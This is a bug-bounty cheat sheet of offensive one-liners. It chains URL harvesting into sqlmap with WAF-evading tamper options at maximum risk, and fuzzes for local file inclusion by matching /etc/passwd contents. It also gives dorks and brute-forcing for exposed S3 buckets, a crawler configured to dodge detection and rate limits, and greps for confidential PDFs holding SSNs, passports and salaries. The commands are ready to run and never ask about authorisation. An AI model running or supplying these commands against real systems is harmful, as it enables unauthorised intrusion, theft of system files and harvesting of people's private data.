# Bugbounty
## 2024 Oneliners found online

### Check SQL
waybackurls 'URL TARGET'| grep '='| httpx --silent --status-code| awk '{print $1}'| xargs -I{} sqlmap -u {} -v 3 --random-agent --tamper "between,randomcase,space2comment" --level 5 --risk 3 --batch --threads 5 --crawl 2 --suffix=') and 1=1-- -'

### Screenshot
cat hosts | gowitness scan file -f - --write-csv  
***

## 2025 Oneliners found online 

## Find Local File Inclusion
findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
***
---

## FIND S3

### Google Dorking
(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"


Tool: dorks_eye
Link: https://github.com/BullsEye0/dorks-eye
- I forked the original. sudo-awk
***

### Using subfinder + httpx

subfinder -d target.com -all -silent | httpx-toolkit -sc -title -td | grep "Amazon S3"
***

### Find using JS files

katana -u https://site.com/ -d 5 -jc | grep '\.js$' | tee alljs.txt
cat alljs.txt | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*\.s3\.amazonaws\.com[^" ]*' | sort -u

***
### Find using java2s3

subfinder -d target.com -all -silent | httpx-toolkit -o file.txt
cat file.txt | grep -oP '(?<=https?:\/\/).*'
python java2s3.py input.txt target.com output.txt
cat output3.txt | grep -E "S3 Buckets: \['[^]]+"
cat output.txt | grep -oP 'https?://[a-zA-Z0-9.-]*s3(\.dualstack)?\.ap-[a-z0-9-]+\.amazonaws\.com/[^\s"<>]+' | sort -u
cat output3.txt | grep -oP '([a-zA-Z0-9.-]+\.s3(\.dualstack)?\.[a-z0-9-]+\.amazonaws\.com)' | sort -u


#### Brute-Forcing S3 Bucket with LazyS3
You can also use this LazyS3 tool — it's basically a brute force tool for AWS S3 buckets using different permutations. you can run the following command by specifying the target domain

***

### Website you can use to find S3 Buckets: 

https://osint.sh/buckets/
grayhatwarefare

Chrome plugin 
https://chromewebstore.google.com/detail/s3bucketlist/anngjobjhcbancaaogmlcffohpmcniki?hl=en

(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
***
---

## Get all urls fast

waymore -i hackerone.com -mode U -oU hackerone_urls.txt

cat subs.txt | gau | uro | tee -a all_urls

katana -u target.com | uro | tee -a urls.katana.out

cat targets.txt | gau | sort | uro | tee -a targets.gau

credits to lostsec
***

## Spider the target fast

katana -u http://[TARGET URL]/ -proxy http://[LOCALIP]:[BURPPROXYPORT]/ -hl -jc --no-sandbox -c 1 -p 1 -rd 3 -rl 5 -tlsi
What it Does:

🔸-u: Target URL:
The web application or interface you want to crawl.

🔸-proxy: Burp Proxy: 
Sends all discovered requests through Burp for interception and analysis.

🔸-hl: Headless mode: 
Hooks internal headless browser calls to handle HTTP requests and responses directly within the browser context. 
This provides two key benefits:
◾Full browser-like fingerprinting (TLS/user-agent), avoiding automated detection.
◾Enhanced discovery by analyzing both raw HTTP responses and JavaScript-rendered content.

🔸-jc: JavaScript crawling. 
Extracts endpoints from within JS files and runtime execution, improving endpoint visibility.

🔸--no-sandbox: Sandbox bypass. 
Bypasses browser sandbox restrictions—useful in restricted or containerized environments.

🔸-c 1: Concurrency = 1. 
Runs one request at a time to stay stealthy and mimic legitimate traffic.

🔸-p 1: Parallelism = 1. 
Prevents simultaneous thread execution, further reducing detection risk.

🔸-rd 3: Recursion depth = 3. 
Crawls up to 3 levels deep to uncover nested endpoints without overwhelming the server.

🔸-rl 5: Rate limit = 5 req/sec. 
Keeps request speed low enough to evade rate-based WAF triggers.

🔸-tlsi: TLS fingerprint evasion. 
Emulates real browser TLS behavior to bypass basic fingerprinting-based defenses.

credits to blackhat ethical Hacking

# Look for interesting files using wayback machine
```curl -G "https://web.archive.org/cdx/search/cdx" — data-urlencode "url=*.example.com/*" — data-urlencode "collapse=urlkey" — data-urlencode "output=text" — data-urlencode "fl=original" > output.txt```

look for interesting file types
```cat out.txt | uro | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.git|\.env|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'```

look for sensitive keyword inside pdf files
```cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only|confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive|bank statement|invoice|salary|contract|agreement|non disclosure|passport|social security|ssn|date of birth|credit card|identity|id number|company confidential|staff only|management only|internal only)' && echo "$url"; done```
